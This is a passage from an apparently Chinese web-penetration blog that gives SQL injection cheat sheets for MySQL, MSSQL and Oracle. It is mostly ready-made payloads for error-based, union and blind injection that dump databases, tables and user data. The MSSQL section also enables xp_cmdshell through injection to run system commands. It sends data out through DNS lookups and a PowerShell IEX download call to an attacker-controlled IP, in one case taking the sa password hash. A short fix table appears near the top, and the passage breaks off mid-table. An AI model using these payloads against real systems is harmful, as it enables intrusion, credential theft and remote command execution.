<p>在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库</p>
<p>当使用该数据时，被取出，这时注入语句生效</p>
<p>注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码</p>
<h3 id="7、其他："><a href="#7、其他：" class="headerlink" title="7、其他："></a>7、其他：</h3><p>文件上传时，可通过文件名进行sql注入</p>
<h1 id="六、DNS外带"><a href="#六、DNS外带" class="headerlink" title="六、DNS外带"></a>六、DNS外带</h1><p><strong>前提：</strong></p>
<p>Windows服务器，secure_file_priv为空（非NULL）</p>
<p><strong>语句：</strong></p>
<pre class="highlight"><span class="line">select load_file(concat(&quot;\\\\&quot;,version(),&quot;.1ndex.dnslog.cn\\x&quot;));</span><br></pre>

<h1 id="七、sql注入防护-修复"><a href="#七、sql注入防护-修复" class="headerlink" title="七、sql注入防护/修复"></a>七、sql注入防护/修复</h1><table>
<thead>
<tr>
<th align="left">修复</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">去掉单引号</td>
<td align="left">现实场景常用单引号，去掉不合实际</td>
</tr>
<tr>
<td align="left">转义单引号</td>
<td align="left">对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
</tr>
<tr>
<td align="left">强制类型转换</td>
<td align="left">针对数字型 intval()</td>
</tr>
<tr>
<td align="left">更改数据库连接方式</td>
<td align="left">POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>MSSQL注入</title>
    <url>/article/MSSQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>端口：1433</p>
<p><strong>Master数据库：</strong></p>
<p>控制SQL Server的所有方面，这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息等</p>
<p><strong>管理员账号</strong>：sa</p>
<h1 id="一、基本语句"><a href="#一、基本语句" class="headerlink" title="一、基本语句"></a>一、基本语句</h1><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">创建数据库</td>
<td align="left">create databases [dbname]</td>
</tr>
<tr>
<td align="left">删除数据库</td>
<td align="left">drop database [dbname]</td>
</tr>
<tr>
<td align="left">创建新表</td>
<td align="left">create table [tablename] (name char(10),age tinyint,sex int)</td>
</tr>
<tr>
<td align="left">删除新表</td>
<td align="left">drop table [tablename]</td>
</tr>
<tr>
<td align="left">向表中插入内容</td>
<td align="left">insert into tablename values(value1,value2)</td>
</tr>
<tr>
<td align="left">删除内容</td>
<td align="left">delete from [tablename] where 范围</td>
</tr>
<tr>
<td align="left">查找</td>
<td align="left"><code>select * from [tablename] where field1=&quot;&quot;</code></td>
</tr>
</tbody></table>
<p>判断是否为mssql数据库 (返回正常是mssql，不正常为access)</p>
<pre class="highlight"><span class="line">?id=1&#x27; and  1&lt;(select count(*) from sysobjects) --  ?id=1&#x27; and  exists (select * from sysobjects) --  </span><br></pre>

<h1 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h1><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断注入点</td>
<td align="left">1’ and 1=1 返回正常 <br>1’ and 1=0 返回错误 <br>利用数字和字符不能比较（字符发生强制类型转换错误） <br>注：=号可换为&lt;、&gt;，低版本mssql使用=可能会报错</td>
</tr>
<tr>
<td align="left">显示数据库版本</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select @@version) --</code></td>
</tr>
<tr>
<td align="left">显示当前数据库名字</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select db_name()) --</code></td>
</tr>
<tr>
<td align="left">显示当前数据库连接的用户</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select user_name()) --</code></td>
</tr>
<tr>
<td align="left">判断当前数据库连接用户的权限 <br>页面正常为sysadmin权限</td>
<td align="left"><code>?id=1&#39; and 1=(select is_srvrolemember(&#39;sysadmin&#39;)) --</code> <br>权限有： <br>sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin <br>注： <br><code>and 1=(select is_member(&#39;db_owner&#39;)) --</code> <br>判断是否为db_owner权限，可通过备份方式向网站写文件</td>
</tr>
<tr>
<td align="left">获取数据库数量</td>
<td align="left">当数据类型为int类型时，无法触发强制类型转换，因此需要结合convert和cast as <br><br><code>?id=1&#39; and 1&lt;char(126)%2b(select cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126) --</code>  <br><br>使用convert <br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126)) --</code> <br><br>或使用二分法 <br><code>?id=1&#39; and 1&lt;(select count(db_name) from master.dbo.sysdatabases) --</code></td>
</tr>
<tr>
<td align="left">获取数据库名称</td>
<td align="left"><code>1&#39; and 1&lt;(select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)) --</code> <br>第二个top 1中的1为查第几个表，意为取前几个，这里使用了逻辑嵌套法，下同</td>
</tr>
<tr>
<td align="left">判断数据库的表数量</td>
<td align="left"><code>?id=1&#39; and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables)%2bchar(126) --</code>  <br><br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --</code></td>
</tr>
<tr>
<td align="left">获取表名称</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)) --</code></td>
</tr>
<tr>
<td align="left">获取列的数量</td>
<td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)--</code>  <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name = &#39;tbname&#39;) --</code></td>
</tr>
<tr>
<td align="left">获取列名</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)) --</code></td>
</tr>
<tr>
<td align="left">获取数据数量</td>
<td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126) -- </code> <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(username) from tbname..users) --</code></td>
</tr>
<tr>
<td align="left">获取数据值</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)) --</code></td>
</tr>
</tbody></table>
<h1 id="三、union联合查询"><a href="#三、union联合查询" class="headerlink" title="三、union联合查询"></a>三、union联合查询</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断列数</td>
<td align="left"><code>?id=1&#39; order by 3 --</code> <br>注： mssql union select 要求前后数据类型保持一致<br>1、用null代替显示位 <br>2、带个替换null，确定数据类型</td>
</tr>
<tr>
<td align="left">判断显示位</td>
<td align="left"><code>?id=-1&#39; union select 1,2,3 --</code> <br><code>?id=1&#39; union select null,null,null --</code> （判断时不要用此句，无显示）</td>
</tr>
<tr>
<td align="left">获取数据库版本</td>
<td align="left"><code>?id=-1&#39; union select 1,@@version,3 --</code></td>
</tr>
<tr>
<td align="left">获取当前数据库名称</td>
<td align="left"><code>?id=-1&#39; union select 1,db_name(),3 --</code></td>
</tr>
<tr>
<td align="left">获取数据库数量</td>
<td align="left"><code>?id=-1&#39; union select 1,(select count(*) from master.dbo.sysdatabases),3 --</code></td>
</tr>
<tr>
<td align="left">获取数据库名称</td>
<td align="left"><code>?id=-1&#39; union select 1,db_name(1),3 --</code> <br>db_name()表示当前数据库，db_name(1)表示第一个数据库  <br><br>或 <br><code>?id=-1&#39; union select top 1 1,name,3 from master.dbo.sysdatabases where name not in (select top 1 name from master.dbo.sysdatabases) --</code></td>
</tr>
<tr>
<td align="left">获取表数量</td>
<td align="left"><code>?id=-1&#39; union select top 1 1,count(table_name),3 from information_schema.tables --</code></td>
</tr>
<tr>
<td align="left">获取表名称</td>
<td align="left">显示当前数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables) -- </code> <br><br>显示指定数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from dbname.information_schema.tables) --</code></td>
</tr>
<tr>
<td align="left">获取列数量</td>
<td align="left"><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns --</code>  <br><br>获取指定表中的字段数量 <br><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --</code></td>
</tr>
<tr>
<td align="left">获取列名</td>
<td align="left"><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.columns where table_name not in (select top 0 table_name from information_schema.tables) --</code><br><br>指定表获取字段 <br><code>?id=-1&#39; union select top 1 column_name,2 from information_schema.columns where table_name=&#39;users&#39; and column_name not in (select top 0 column_name FROM information_schema.columns where table_name = &#39;users&#39;)) --</code></td>
</tr>
<tr>
<td align="left">获取数据数量</td>
<td align="left"><code>?id=-1&#39; union select top 1 1,count(username),3 from test..users --</code></td>
</tr>
<tr>
<td align="left">获取数据值</td>
<td align="left"><code>?id=-1&#39; union select top 1 username from test..users where username not in (select top 0 username from test..users) --</code></td>
</tr>
</tbody></table>
<h1 id="四、Bool盲注（二分法）"><a href="#四、Bool盲注（二分法）" class="headerlink" title="四、Bool盲注（二分法）"></a>四、Bool盲注（二分法）</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断</td>
<td align="left"><code>?id=1&#39; and 1=1 – ?id=1&#39; and 1=0 --</code></td>
</tr>
<tr>
<td align="left">判断数据库版本长度</td>
<td align="left"><code>?id=1&#39; and 1&lt;len(@@version)--</code></td>
</tr>
<tr>
<td align="left">判断数据库版本名称</td>
<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(@@version,1,1)) --</code></td>
</tr>
<tr>
<td align="left">判断当前数据库长度</td>
<td align="left"><code>?id=1&#39; and 1&lt;len(db_name()) --</code></td>
</tr>
<tr>
<td align="left">判断当前数据库名称</td>
<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(db_name(),1,1)) --</code></td>
</tr>
<tr>
<td align="left">判断数据库数量</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select count(*) from master.dbo.sysdatabases) --</code></td>
</tr>
<tr>
<td align="left">逐个判断数据库长度</td>
<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases))) --</code></td>
</tr>
<tr>
<td align="left">逐个判断数据库名称</td>
<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1)) --</code></td>
</tr>
<tr>
<td align="left">判断表数量</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --</code></td>
</tr>
<tr>
<td align="left">逐个判断表长</td>
<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))) --</code></td>
</tr>
<tr>
<td align="left">逐个判断表名</td>
<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1)) --</code></td>
</tr>
<tr>
<td align="left">判断列数</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;) --</code></td>
</tr>
<tr>
<td align="left">逐个判断列的长度</td>
<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;))) --</code></td>
</tr>
<tr>
<td align="left">逐个判断列名</td>
<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)),1,1)) --</code></td>
</tr>
<tr>
<td align="left">判断数据数量</td>
<td align="left"><code>?id=1&#39; and 1&lt;(select count(username) from dbname..tbname) --</code></td>
</tr>
<tr>
<td align="left">逐个判断数据长度</td>
<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users))) --</code></td>
</tr>
<tr>
<td align="left">逐个判断数据值</td>
<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1)) --</code></td>
</tr>
</tbody></table>
<h1 id="五、时间延时盲注"><a href="#五、时间延时盲注" class="headerlink" title="五、时间延时盲注"></a>五、时间延时盲注</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断数据库版本长度</td>
<td align="left"><code>?id=1&#39; if(len(@@version)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
</tr>
<tr>
<td align="left">判断数据库版本名</td>
<td align="left"><code>?id=1&#39; if(ascii(substring(@@version),1,1)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
</tr>
<tr>
<td align="left">判断当前数据库长度</td>
<td align="left"><code>?id=1&#39; if(len(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
</tr>
<tr>
<td align="left">判断当前数据库名称</td>
<td align="left"><code>?id=1&#39; if(ascii(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
</tr>
<tr>
<td align="left">判断数据库数量</td>
<td align="left"><code>?id=1&#39; if((select count(*) from master.dbo.sysdatabases)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
</tr>
<tr>
<td align="left">逐个判断数据库长度</td>
<td align="left"><code>?id=1&#39; if(len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
</tr>
<tr>
<td align="left">逐个判断数据库名</td>
<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
</tr>
<tr>
<td align="left">判断表数量</td>
<td align="left"><code>?id=1&#39; if((select count(table_name) from information_schema.tables)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
</tr>
<tr>
<td align="left">逐个判断表长度</td>
<td align="left"><code>?id=1&#39; if((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
</tr>
<tr>
<td align="left">逐个判断表名</td>
<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
</tr>
<tr>
<td align="left">判断列数</td>
<td align="left"><code>?id=1&#39; if((select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
</tr>
<tr>
<td align="left">逐个判断列长</td>
<td align="left"><code>?id=1&#39; if((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
</tr>
<tr>
<td align="left">逐个判断列名</td>
<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.columns where column_name not in (select top 1 column_name from information_schema.columns)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
</tr>
<tr>
<td align="left">判断数据数量</td>
<td align="left"><code>?id=1&#39; if((select count(username) from tbname..users)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
</tr>
<tr>
<td align="left">逐个判断数据长度</td>
<td align="left"><code>?id=1&#39; if(len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
</tr>
<tr>
<td align="left">逐个判断数据值</td>
<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
</tr>
</tbody></table>
<h1 id="六、命令执行"><a href="#六、命令执行" class="headerlink" title="六、命令执行"></a>六、命令执行</h1><p>xp_cmdshell 默认关闭状态/管理员才可以开启</p>
<pre class="highlight"><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line"></span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line"></span><br><span class="line">RECONFIGURE;</span><br></pre>

<p><strong>开启xp_cmdshell功能</strong></p>
<pre class="highlight"><span class="line">?id=1&#x27;; EXEC sp_configure &#x27;show advanced options&#x27;, 1;--</span><br><span class="line"></span><br><span class="line">?id=1&#x27;; RECONFIGURE;--</span><br><span class="line"></span><br><span class="line">?id=1&#x27;; EXEC sp_configure &#x27;xp_cmdshell&#x27;,1--</span><br><span class="line"></span><br><span class="line">?id=1&#x27;; RECONFIGURE--</span><br></pre>

<p><strong>验证xp_cmdshell功能</strong></p>
<pre class="highlight"><span class="line">?id=1&#x27;; exec master..xp_cmdshell &#x27;ping -n 10 127.0.0.1&#x27; --</span><br></pre>

<p><strong>用sql注入，来获取命令执行结果</strong></p>
<p>1、创建一个表，再把命令执行的结果，写入到表中。</p>
<pre class="highlight"><span class="line">`?id=1&#x27;; create table sqldata(result VARCHAR(8000)); --`</span><br></pre>

<p>2、执行命令，并且把结果写入表中</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">直接写入</td>
<td align="left"><code>?id=1&#39;;INSERT INTO sqldata (result) EXEC master..xp_cmdshell &#39;net user&#39;--</code></td>
</tr>
<tr>
<td align="left">转换一下</td>
<td align="left"><code>?id=1&#39;;DECLARE @adqa VARCHAR(8000);SET @adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa--</code></td>
</tr>
</tbody></table>
<h1 id="七、DNS外带"><a href="#七、DNS外带" class="headerlink" title="七、DNS外带"></a>七、DNS外带</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">字符型外带–指定ip端口</td>
<td align="left"><code>?id=1;DECLARE @a varchar(8000);SET @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(CONVERT(varbinary,name)) from Master.dbo.SysDatabases);exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) --</code></td>
</tr>
<tr>
<td align="left">数字型外带–指定ip端口</td>
<td align="left"><code>?id=1;DECLARE @a VARCHAR(8000);SET @a=(SELECT TOP 1 substring(@@version,1,35));exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) --</code></td>
</tr>
<tr>
<td align="left">字符型外带–dnslog平台***</td>
<td align="left"><code>?id=1&#39;;declare @a varchar(1024);set @a=db_name();exec(&#39;master..xp_dirtree &quot;//&#39;%2B @a %2B&#39;.dnslog.io&quot;&#39;)--</code></td>
</tr>
<tr>
<td align="left">数字型外带–dnslog平台</td>
<td align="left"><code>?id=1; declare @a varchar(1024);set @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name=&#39;sa&#39;); exec(&#39;master..xp_cmdshell &quot;ping -n 2&#39; %2b @a %2b &#39;.dnslog.com&#39; &quot;)--</code></td>
</tr>
</tbody></table>
<p>http外带需要监听http端口（python -m http.server 9008）</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>MSSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle注入</title>
    <url>/article/Oracle%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p><strong>端口：1521</strong></p>
<p><strong>使用</strong></p>
<p>select * from dual; dual是oracle数据库中的虚拟表，用于占位查询</p>
<p>注释：<code>--</code></p>
<p>chr(126)为~，为分隔符</p>
<p>utl_url.escape() url编码</p>
<p>对限定条件进行编码，解决dns外带乱码问题</p>
<p>&lt;&gt;可替代not in，用于嵌套查询，但是可用limit代替</p>
<h1 id="一、union联合注入"><a href="#一、union联合注入" class="headerlink" title="一、union联合注入"></a>一、union联合注入</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断注入</td>
<td align="left"><code>&#39;、&quot;、\、and 1=1、and 1=2</code></td>
</tr>
<tr>
<td align="left">判断数据库类型</td>
<td align="left">返回正常为oracle数据库 <br><code>and len(&#39;a&#39;) = 1</code>         长度函数 <br><code>and exist(select * from dual)</code>       dual表<br><code>and (select count(*) from user_tables)&gt;0 --</code>     user_tables 系统表</td>
</tr>
<tr>
<td align="left">判断列数</td>
<td align="left">order by</td>
</tr>
<tr>
<td align="left">判断占位符</td>
<td align="left">oracle数据库需要查询类型与表结构类型匹配，否则报错 使用时查询出一个数字型和一个字符型显示位即可，其余位用null占位<br>如： <br><code>union select 1,&#39;2&#39;,null,null from dual--</code></td>
</tr>
<tr>
<td align="left">获取基本信息</td>
<td align="left">获取数据库版本 <br><code>union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual--</code>  <br><br>获取数据库连接用户名 <br><code>union select 1,(select sys_context(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;) from dual),3,4 from dual--</code> <br><br>或 <br><code>union select 1,(select user from dual),3,4 from dual--</code>  <br><br>获取日志文件绝对路径 <br><code>union select 1,(select instance_name from v$instance),3,4 from dual--</code></td>
</tr>
<tr>
<td align="left">查用户</td>
<td align="left"><code>union select 1,cast(owner as varchar(4000)),3,4 from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1--</code><br><br>rownum：隐藏的行号</td>
</tr>
<tr>
<td align="left">查表名</td>
<td align="left"><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1-- </code><br><br>或 <br><code>union select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from all_tables)) where limit=1--</code></td>
</tr>
<tr>
<td align="left">查列名</td>
<td align="left"><code>union select 1,cast(column_name as varchar(4000)),3,4 from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1--</code></td>
</tr>
<tr>
<td align="left">查数据</td>
<td align="left"><code>union select 1,cast(name,pwd as varchar(4000)),3,4 from (select name,pwd,rownum as limit from (select * from 列名)) where limit=1 --</code></td>
</tr>
</tbody></table>
<h1 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h1><p><strong>常用报错函数</strong></p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">dbms_xdb_version.checkin()</td>
<td align="left">检入签出的VCR并返回新创建的版本的资源ID <br><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null</code></td>
</tr>
<tr>
<td align="left">dbms_xdb_version.uncheckout()</td>
<td align="left">同checkin <br><code>and (select dbms_xdb_version.uncheckout((select user from dual))from dual)is not null</code></td>
</tr>
<tr>
<td align="left">utl_inaddr.get_host_name()</td>
<td align="left">在Oracle 11g及以后的版本中需要网络访问权限才可以使用 获取ip地址，其参数如果解析不了会报错 <br><code>and utl_inaddr.get_host_name((select user from dual))=1--</code></td>
</tr>
<tr>
<td align="left">dbms_xdb_version.makeversioned()</td>
<td align="left"><code>and (select dbms_xdb_version.makeversioned((select user from dual))from dual)is not null--</code></td>
</tr>
<tr>
<td align="left">dbms_utility.sqlid_to_sqlhash()</td>
<td align="left"><code>and (select dbms_utility.sqlid_to_sqlhash((select user from dual))from dual)is not null--</code></td>
</tr>
<tr>
<td align="left">ordsys.ord_dicom.getmappingxpath()</td>
<td align="left"><code>and ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)=1--</code></td>
</tr>
<tr>
<td align="left">ctxsys.drithsx.sn()</td>
<td align="left"><code>and ctxsys.drithsx.sn(1,(select user from dual))=1--</code></td>
</tr>
</tbody></table>
<p><strong>过程</strong></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">获取数据库版本</td>
<td align="left"><code>and(select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1))from dual)is not null--</code></td>
</tr>
<tr>
<td align="left">获取用户名</td>
<td align="left"><code>and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null-- </code><br><br>或<br><code>and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1)) from dual) is not null --</code></td>
</tr>
<tr>
<td align="left">获取表名</td>
<td align="left"><code>and (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1)) from dual) is not null --</code></td>
</tr>
<tr>
<td align="left">获取列名</td>
<td align="left"><code>and (select dbms_xdb_version.checkin((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1)) from dual) is not null --</code></td>
</tr>
<tr>
<td align="left">获取数据</td>
<td align="left">`and(select dbms_xdb_version.checkin((select AGE</td>
</tr>
</tbody></table>
<h1 id="三、布尔盲注"><a href="#三、布尔盲注" class="headerlink" title="三、布尔盲注"></a>三、布尔盲注</h1><p>相关函数</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">decode()</td>
<td align="left">if(条件==值1)正确返回翻译值1，否则返回默认值 <br>decode(条件,值1,翻译值1,值2,翻译值2,…值n,翻译值n,缺省值)</td>
</tr>
<tr>
<td align="left">instr()</td>
<td align="left">返回发现指定的字符的位置 <br>instr(string1,string2)<br>instr(源字符串,目标字符串)</td>
</tr>
</tbody></table>
<p>1、猜解法</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断用户名</td>
<td align="left"><code>and (select ascii(substr(user,1,1))from dual)&gt;1--</code> <br><br>或 <br><code>and (select ascii(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1))from dual)&gt;1--</code></td>
</tr>
<tr>
<td align="left">判断表名</td>
<td align="left"><code>and (select ascii(substr(table_name,1,1)) from user_tables where rownum=1)&gt;1--</code></td>
</tr>
<tr>
<td align="left">判断列名</td>
<td align="left"><code>and (select ascii(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1))from dual)&gt;1--</code></td>
</tr>
<tr>
<td align="left">判断数据</td>
<td align="left">`and (select ascii(substr((select AGE</td>
</tr>
</tbody></table>
<p>2、decode</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">判断用户名</td>
<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,1,0)from dual)-- </code><br>T为猜解的字母<br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
</tr>
<tr>
<td align="left">判断表名</td>
<td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
</tr>
<tr>
<td align="left">判断字段名</td>
<td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
</tr>
<tr>
<td align="left">判断数据</td>
<td align="left"><code>and(select decode(substr((select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--</code></td>
</tr>
</tbody></table>
<p>3、instr</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
